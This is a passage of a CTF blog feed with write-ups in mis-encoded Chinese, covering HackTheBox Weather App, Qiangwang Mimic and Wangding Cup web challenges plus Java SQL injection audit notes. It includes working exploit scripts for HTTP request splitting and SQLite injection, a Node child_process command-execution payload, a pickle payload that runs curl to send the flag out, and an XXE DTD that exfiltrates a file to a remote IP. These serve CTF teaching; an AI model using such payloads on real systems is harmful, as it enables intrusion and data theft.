eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#x27;child_&#x27;+&#x27;pro&#x27;+&#x27;cess&#x27;)[&#x27;ex&#x27;+&#x27;ecSync&#x27;](&#x27;cat /flag.txt&#x27;).toString()&quot;)</span><br><span class="hljs-string">-return x</span><br><span class="hljs-string">------WebKitFormBoundarynWjDdj9HcJ7ILyVa--</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\r\n&#x27;</span>)<br><br>payload = payload.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(body), body) \<br>    .replace(<span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;\u012b&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\u0120&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27;\r\n&#x27;</span>, <span class="hljs-string">&#x27;\u010d\u010a&#x27;</span>)    \<br>    .replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\u0122&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;\u0a27&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;\u015b&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;\u015d&#x27;</span>) \<br>    + <span class="hljs-string">&#x27;GET&#x27;</span> + <span class="hljs-string">&#x27;\u0120&#x27;</span> + <span class="hljs-string">&#x27;/&#x27;</span>  <span class="hljs-comment">#é—­åˆä¸‹ä¸€ä¸ªè¯·æ±‚</span><br><span class="hljs-built_in">print</span>(payload)<br>requests.get(<br>    <span class="hljs-string">&#x27;http://68d9e1b4-926e-4d78-974c-b5eed4e09526.node4.buuoj.cn:81/core?q=&#x27;</span> + payload)<br><br><span class="hljs-built_in">print</span>(requests.get(<br>    <span class="hljs-string">&#x27;http://68d9e1b4-926e-4d78-974c-b5eed4e09526.node4.buuoj.cn:81/?action=shell&#x27;</span>).text)<br></code></pre></div></td></tr></table></figure><h1 id="hackthebox-Weather-App"><a href="#hackthebox-Weather-App" class="headerlink" title="[hackthebox] Weather App"></a>[hackthebox] Weather App</h1><p>nodeè€ƒç‚¹ä¸€æ ·ä½†æ˜¯å¤šåŠ äº†ä¸€ä¸ªsqliteæ³¨å…¥ã€‚</p><p>æŸ¥è¯¢å¤©æ°”å¤„å­˜åœ¨httpè¯·æ±‚æ‹†åˆ†æ‰“ssrf</p><p><img src="https://img-blog.csdnimg.cn/de3532e7f2754382822d63865613f97e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç¨å¾®æ”¹æ”¹ä¸Šé¢çš„è„šæœ¬ã€‚æŠ“åŒ…å°†ç”Ÿæˆçš„payloadå‘åŒ…ï¼Œå‘ç°å¯æ¥å—åˆ°</p><p><img src="https://img-blog.csdnimg.cn/fae549d9f7f74697b9542fd34b9d9b5a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>sqliteä¸­å­˜åœ¨ä¸€ä¸ªæ’å…¥å’Œä¸€ä¸ªæŸ¥è¯¢æ“ä½œ</p><p><img src="https://img-blog.csdnimg.cn/81b6e4f18c1841d0906196c4489db839.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é‡Œåˆ©ç”¨<code>admin&#39; ON CONFLICT(username) DO UPDATE set password=&#39;123&#39;-+</code>æ¥é—­åˆæ’å…¥è¯­å¥ï¼Œå½“æ’å…¥å­˜åœ¨å†²çªæ—¶è‡ªåŠ¨æ›´æ–°å¯†ç </p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br>payload = <span class="hljs-string">&quot;&quot;&quot; HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Connection: keep-alive</span><br><span class="hljs-string"></span><br><span class="hljs-string">POST /register HTTP/1.1</span><br><span class="hljs-string">Host: 167.99.202.131:32102</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: 85</span><br><span class="hljs-string"></span><br><span class="hljs-string">username=admin&amp;password=admin&#x27; ON CONFLICT(username) DO UPDATE set password=&#x27;123&#x27;-+</span><br><span class="hljs-string">&quot;&quot;&quot;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\r\n&#x27;</span>)<br><br>payload = payload \<br>    .replace(<span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;\u012b&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\u0120&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27;\r\n&#x27;</span>, <span class="hljs-string">&#x27;\u010d\u010a&#x27;</span>)    \<br>    .replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\u0122&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;\u0a27&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;\u015b&#x27;</span>)             \<br>    .replace(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;\u015d&#x27;</span>)                \<br>    + <span class="hljs-string">&#x27;\u010d\u010aGET&#x27;</span> + <span class="hljs-string">&#x27;\u0120&#x27;</span> + <span class="hljs-string">&#x27;/&#x27;</span><br><br>data = &#123;<span class="hljs-string">&quot;endpoint&quot;</span>:<span class="hljs-string">f&#x27;127.0.0.1/xxx?p=1<span class="hljs-subst">&#123;payload&#125;</span>&#x27;</span>,<br>        <span class="hljs-string">&quot;city&quot;</span>:<span class="hljs-string">&quot;uk&quot;</span>,<br>        <span class="hljs-string">&quot;country&quot;</span>:<span class="hljs-string">&quot;London&quot;</span>&#125;<br><span class="hljs-comment"># print(json.dumps(data))</span><br>res = requests.post(<span class="hljs-string">&#x27;http://167.99.202.131:32102/api/weather&#x27;</span>,data=json.dumps(data),headers=&#123;<span class="hljs-string">&quot;Content-type&quot;</span>:<span class="hljs-string">&quot;application/json&quot;</span>,<br>                                                                                 <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&quot;</span>&#125;)<br>flag = requests.post(<span class="hljs-string">&quot;http://167.99.202.131:32102/login&quot;</span>,data=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(flag.text)<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/842d24145db140aaafec359b2a0ad2f2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>nodejs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2021/11/16/2021-11-L3hctf/"/>
    <url>/2021/11/16/2021-11-L3hctf/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>å¼ºç½‘æ‹Ÿæ€</title>
    <link href="/2021/11/07/2021-11-%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/"/>
    <url>/2021/11/07/2021-11-%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/</url>
    
    <content type="html"><![CDATA[<h3 id="zerocalc"><a href="#zerocalc" class="headerlink" title="zerocalc"></a>zerocalc</h3><p>é¢˜ç›®æç¤ºreadFile(â€œ./src/index.jsâ€)ï¼Œæ‰€ä»¥å°è¯•readFile(â€œ/flagâ€)å¾—åˆ°flag</p><p><img src="https://md.buptmerak.cn/uploads/upload_58b9e93800f31335dac6f874a29cfa1a.png" alt="img"></p><h3 id="new-hospital"><a href="#new-hospital" class="headerlink" title="new_hospital"></a>new_hospital</h3><p>æ‰«æç›®å½•ã€‚å¯ä»¥å‘ç°/old/ ä»¥åŠ/flag.phpã€‚<br>ç„¶åé€šè¿‡awvså¯ä»¥å‘ç°ï¼Œåœ¨feature.phpä¸‹æœ‰ä¸€ä¸ªapiä¼šåˆ©ç”¨Cookie includeæ–‡ä»¶ã€‚<br>å‘ç°/featureä¸æ˜¯å¾ˆå¥½ç”¨ï¼Œåˆ©ç”¨/old/feature.phpæ¥åŒ…å«ä»»æ„æ–‡ä»¶ã€‚ç›´æ¥åŒ…å«/var/www/html/flag.phpå³å¯ã€‚</p><h3 id="EasyFilter"><a href="#EasyFilter" class="headerlink" title="EasyFilter"></a>EasyFilter</h3><p>æä¾›äº†å†™å…¥å’Œè¯»å–ä¸¤ç§æ“ä½œï¼Œb64å‚æ•°cä¹‹åå†™å…¥æ–‡ä»¶å†…<br>å†™å…¥ä¹‹åä¼šè¿”å›æ–‡ä»¶åï¼Œæ¥ä¸‹æ¥çš„é—®é¢˜æ˜¯æ€ä¹ˆåœ¨åŒ…å«æ—¶èƒ½å¤Ÿè§£ç æ–‡ä»¶ï¼Œå› ä¸ºè¯»å–æ—¶åªèƒ½æ§åˆ¶â€resource=â€åé¢çš„å†…å®¹<br>æ„é€ <code>r=convert.base64-decode/../xxx</code><br>æ‹¼æ¥åæˆä¸º<code>php://filter/resource=./files/convert.base64-decode/../xxx</code><br>è°ƒç”¨äº†è½¬æ¢è¿‡æ»¤å™¨çš„åŒæ—¶åˆæŠŠ<code>convert.base64-decode</code>å½“æˆäº†ä¸€ä¸ªæ–‡ä»¶åï¼ŒåŠ <code>../</code>è¿›è¡Œç›®å½•ç©¿è¶ŠååŒ…å«åˆ°æ¶æ„ä»£ç (ä¸Šé¢ä¼šæœ‰ä¸€å †æŠ¥é”™ï¼Œé›€æ°æŒºå¦ç±»çš„)<br><img src="https://md.buptmerak.cn/uploads/upload_23403d8ce8b50e2a191d26e8bbbf55dd.png" alt="img"></p><h3 id="Jack-Shiro"><a href="#Jack-Shiro" class="headerlink" title="Jack-Shiro"></a>Jack-Shiro</h3><p>å¤©ç¿¼æ¯åŸé¢˜ï¼Œé¦–å…ˆ/;/ç»•è¿‡ï¼Œç„¶å<a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a>ç›´æ¥æ‰“<br><img src="https://md.buptmerak.cn/uploads/upload_fa14a8e59c7d21682ccfa66c4d509322.png" alt="img"><br><img src="https://md.buptmerak.cn/uploads/upload_7cfd9ce031a9680de9c4b5ac6c981662.png" alt="img"></p><h3 id="Give-me-your-0day"><a href="#Give-me-your-0day" class="headerlink" title="Give_me_your_0day"></a>Give_me_your_0day</h3><p>å®‰è£…é¡µé¢å­˜åœ¨æ•°æ®åº“è¿æ¥æ“ä½œï¼Œè€ƒè™‘ç”¨<a href="https://github.com/allyshka/Rogue-MySql-Server">rogue_mysql</a>æ­å»ºæ¶æ„mysql serverï¼Œå°è¯•åå‘ç°è¢«forbiddenäº†<img src="https://md.buptmerak.cn/uploads/upload_6fa66bf83711125947b7942d00635bd9.png" alt="img"><br>è§‚å¯Ÿinstall.phpåï¼Œå‘ç°é¢˜ç›®æä¾›äº†å¤šä¸ªæ•°æ®åº“é€‰æ‹©ã€‚é€‰æ‹©mysqliåæˆåŠŸå¾—åˆ°flag<img src="https://md.buptmerak.cn/uploads/upload_9f0816d213c0d813ac6a973bae2a487a.png" alt="img"><br><img src="https://md.buptmerak.cn/uploads/upload_f94b19fd43118d06ecf04e9a01bfe0fa.png" alt="img"></p><h3 id="ezPickle"><a href="#ezPickle" class="headerlink" title="ezPickle"></a>ezPickle</h3><p>pickleååºåˆ—åŒ–é¢˜ã€‚åœ¨<code>config</code>ä¸­æœ‰åé—¨ï¼Œä½†æ˜¯éœ€è¦ä¿®æ”¹notadminä¸­çš„<code>admin</code>ä¸º<code>yes</code>ã€‚</p><figure class="highlight xquery"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xquery">Class RestrictedUnpickler(pickle.Unpickler):<br>    def find_class(self, <span class="hljs-keyword">module</span>,<span class="hljs-built_in"> name</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">module</span> <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;config&#x27;</span>] <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;__&quot;</span><span class="hljs-built_in"> not</span> <span class="hljs-keyword">in</span><span class="hljs-built_in"> name</span>:<br>            <span class="hljs-keyword">return</span> getattr(sys.modules[<span class="hljs-keyword">module</span>],<span class="hljs-built_in"> name</span>)<br>        raise pickle.UnpicklingError(<span class="hljs-string">&quot;&#x27;%s.%s&#x27; not allowed&quot;</span> % (<span class="hljs-keyword">module</span>,<span class="hljs-built_in"> name</span>))<br></code></pre></div></td></tr></table></figure><p>è§‚å¯Ÿå‘ç°é™å®šäº†<code>c</code>æ“ä½œç¬¦åŠ è½½çš„<code>module</code>ä¸º<code>config</code>ï¼Œæ‰‹æ“ä¸ªè¦†ç›–, å¹¶ä¸”æ‰§è¡Œåé—¨ã€‚</p><figure class="highlight arcade"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arcade">cconfig<br>notadmin<br>(S<span class="hljs-string">&#x27;admin&#x27;</span><br>S<span class="hljs-string">&#x27;yes&#x27;</span><br>ucconfig<br>backdoor<br>(S<span class="hljs-string">&#x27;exec(&quot;import os;os.system(&#x27;</span>curl ip -d <span class="hljs-string">`cat /flag`</span><span class="hljs-string">&#x27;)&quot;)&#x27;</span><br>tR.<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç½‘é¼æ¯javaé¢˜</title>
    <link href="/2021/11/06/2021-11-%E7%BD%91%E9%BC%8E%E6%9D%AFjava%E9%A2%98/"/>
    <url>/2021/11/06/2021-11-%E7%BD%91%E9%BC%8E%E6%9D%AFjava%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="ç½‘é¼æ¯-2020-filejava"><a href="#ç½‘é¼æ¯-2020-filejava" class="headerlink" title="ç½‘é¼æ¯ 2020 filejava"></a>ç½‘é¼æ¯ 2020 filejava</h1><p><a href="https://www.4armed.co/blog/exploiting-xxe-with-excel/">https://www.4armed.co/blog/exploiting-xxe-with-excel/</a></p><p><a href="https://xz.aliyun.com/t/7747">https://xz.aliyun.com/t/7747</a></p><p>ä¸‹è½½æ–‡ä»¶å¤„æœ‰filenameç›®å½•ç©¿è¶Šï¼Œç»“åˆæŠ¥é”™å¯çŸ¥é“æºç ä½ç½®ä»è€Œdumpä¸‹æºç å¼€å§‹å®¡è®¡</p><p><img src="https://img-blog.csdnimg.cn/afd99418b023483389e6210ebb2497d1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/a2f5a947cd70454cb3c03923d962d22c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>çœ‹åˆ°è¿™é‡Œå°±å¾ˆæ˜æ˜¾äº†ï¼Œåˆ¤æ–­åç¼€ååº”è¯¥æ˜¯xlsxï¼Œå¼€å¤´é™åˆ¶äº†ä¸ºexcel-ï¼Œè€ƒçš„å°±æ˜¯excelè¿›è¡Œxxeæ”»å‡»</p><p>æœ€å¼€å§‹ä½¿ç”¨å¾—æ˜¯è¿™ç§æ‰“æ³•</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; standalone&#x3D;&quot;yes&quot;?&gt;<br>&lt;!DOCTYPE ANY[<br>&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;<br>&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;vps:2122&#x2F;1.dtd&quot;&gt;<br>%remote;<br>%all;<br>]&gt;<br>&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;<br></code></pre></div></td></tr></table></figure><p>1.dtdä¸º</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;vps:2122&#x2F;%file;&#39;&gt;&quot;&gt;<br></code></pre></div></td></tr></table></figure><p>æ„Ÿè§‰éƒ½è¡Œçš„ï¼Œä½†æ˜¯æ€ä¹ˆæ‰“ä¹Ÿæ‰“ä¸é€šï¼Œåæ¥æ¢äº†ä¸€ä¸‹ï¼Œ</p><p><img src="https://img-blog.csdnimg.cn/5dc2c253ce9d42789fca303bd78f8296.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>file.dtdä¸­ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;39.107.239.30:3333?p&#x3D;%file;&#39;&gt;&quot;&gt;<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/023f546407c845e48a269462caf19bde.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/74b606bf5867403eae11993a981078cd.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="ç½‘é¼æ¯ThinkJava"><a href="#ç½‘é¼æ¯ThinkJava" class="headerlink" title="ç½‘é¼æ¯ThinkJava"></a>ç½‘é¼æ¯ThinkJava</h1><p>æ‹¼æ¥å¯¼è‡´æ³¨å…¥æ¼æ´</p><p><img src="https://img-blog.csdnimg.cn/36c3078bd52246ccabf5547d073cd4bd.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><code>myapp#&#39; union select pwd from user#</code>è¿™é‡Œè¿˜éœ€è¦ä¿è¯å‰é¢çš„æ•°æ®åº“è¿æ¥æ­£ç¡®</p><p><img src="https://img-blog.csdnimg.cn/7c3e1c471d344040ad211b3e5645ea0e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç™»å½•åå‘ç°æç¤ºï¼Œè¿™é‡Œç”¨burpåˆ†æå‘ç°æ˜¯romeæ¼æ´ï¼Œç›´æ¥ä¸€æŠŠæ¢­</p><p><img src="https://img-blog.csdnimg.cn/accd2ef5f88f49d79e69d8f04458f597.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç”Ÿæˆpayload</p><p><img src="https://img-blog.csdnimg.cn/cdae5b45b0c54f2a9387cfed09139649.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç›‘å¬å³å¯</p><p><img src="https://img-blog.csdnimg.cn/62e4b8fe0d9d4bb19b22fb6925e79cac.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cc3</title>
    <link href="/2021/11/06/2021-10-cc3/"/>
    <url>/2021/11/06/2021-10-cc3/</url>
    
    <content type="html"><![CDATA[<p>å‚è€ƒï¼š</p><p><a href="https://xz.aliyun.com/t/7945#toc-27">https://xz.aliyun.com/t/7945#toc-27</a></p><p><a href="https://www.cnblogs.com/liudaihuablogs/p/14167448.html">https://www.cnblogs.com/liudaihuablogs/p/14167448.html</a></p><p>javaåˆå­¦æ˜¯çœŸæ»´éš¾å—ï¼Œç½‘ä¸Šä¸€äº›ååºåˆ—åŒ–éƒ½ç›´æ¥ä»ccåº“å¼€å§‹æ— è¯­ï¼Œç¡¬ç€å¤´çš®çœ‹å§</p><h1 id="sqlæ³¨å…¥æ¼æ´"><a href="#sqlæ³¨å…¥æ¼æ´" class="headerlink" title="sqlæ³¨å…¥æ¼æ´"></a>sqlæ³¨å…¥æ¼æ´</h1><p>å¯å‚è€ƒ<a href="https://b1ngz.github.io/java-sql-injection-note/">https://b1ngz.github.io/java-sql-injection-note/</a></p><ol><li><p><strong>ç›´æ¥æ‹¼æ¥ï¼Œæœªè¿›è¡Œè¿‡æ»¤</strong></p><p>å°†<code>request.getParameter(&quot;&quot;)</code>ç›´æ¥æ”¾åœ¨SQLè¯­å¥ã€‚</p><p>å…¨å±€æœç´¢æŸ¥çœ‹ï¼š<code>String sql</code>ç­‰ã€‚</p></li></ol><p><img src="https://img-blog.csdnimg.cn/64300da5efe04ed4852c4683d714c2f2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        resp.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>        PrintWriter out = resp.getWriter();<br>        Enumeration parameterNames=req.getParameterNames();<br>        System.out.println(parameterNames);<br>        <span class="hljs-keyword">while</span> (parameterNames.hasMoreElements())&#123;<br>            String t = (String) parameterNames.nextElement();<br>            <span class="hljs-keyword">if</span>(t.equals(<span class="hljs-string">&quot;username&quot;</span>))&#123;<br>                useranme = req.getParameter(t).trim();<br>                out.write(<span class="hljs-string">&quot;&lt;p1&gt;&quot;</span> + <span class="hljs-string">&quot;username:&quot;</span> + useranme + <span class="hljs-string">&quot;&lt;/p1&gt;&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (t.equals(<span class="hljs-string">&quot;password&quot;</span>))&#123;<br>                password = req.getParameter(t).trim();<br>                out.write(<span class="hljs-string">&quot;&lt;p1&gt;&quot;</span> + <span class="hljs-string">&quot;password:&quot;</span> + password + <span class="hljs-string">&quot;&lt;/p1&gt;&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                out.write(<span class="hljs-string">&quot;only user pass&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br><span class="hljs-comment">//        System.out.println(param);</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            login(useranme,password);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><ol><li><p><strong>%å’Œ_</strong></p><p>æ²¡æœ‰æ‰‹åŠ¨è¿‡æ»¤%ã€‚é¢„ç¼–è¯‘æ˜¯ä¸èƒ½å¤„ç†è¿™ä¸ªç¬¦å·çš„ï¼Œ æ‰€ä»¥éœ€è¦æ‰‹åŠ¨è¿‡æ»¤ï¼Œå¦åˆ™ä¼šé€ æˆæ…¢æŸ¥è¯¢ï¼Œé€ æˆ dosã€‚</p></li><li><p><strong>Order byã€fromç­‰æ— æ³•é¢„ç¼–è¯‘</strong></p><p>å¦‚ä»¥ä¸‹ç¤ºä¾‹ï¼Œéœ€è¦æ‰‹åŠ¨è¿‡æ»¤ï¼Œå¦åˆ™å­˜åœ¨sqlæ³¨å…¥ã€‚</p><p><code>String sql = &quot;Select * from news where title =?&quot; + &quot;order by &#39;&quot; + time + &quot;&#39; asc&quot;</code></p></li><li><p><strong>Mybatis æ¡†æ¶</strong></p><p>ä½¿ç”¨æ³¨è§£æˆ–è€…xmlå°†javaå¯¹è±¡ä¸æ•°æ®åº“sqlæ“ä½œå¯¹åº”ã€‚</p><p>åœ¨æ³¨è§£ä¸­æˆ–è€… Mybatis ç›¸å…³çš„é…ç½®æ–‡ä»¶ä¸­æœç´¢ $ ã€‚ç„¶åæŸ¥çœ‹ç›¸å…³ sql è¯­å¥ä¸Šä¸‹æ–‡ç¯å¢ƒã€‚</p><p><strong>mybatisç®€å•ç¤ºä¾‹</strong></p><ul><li>mybatisçš„mavené…ç½®</li></ul><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></div></td></tr></table></figure></li></ol><h1 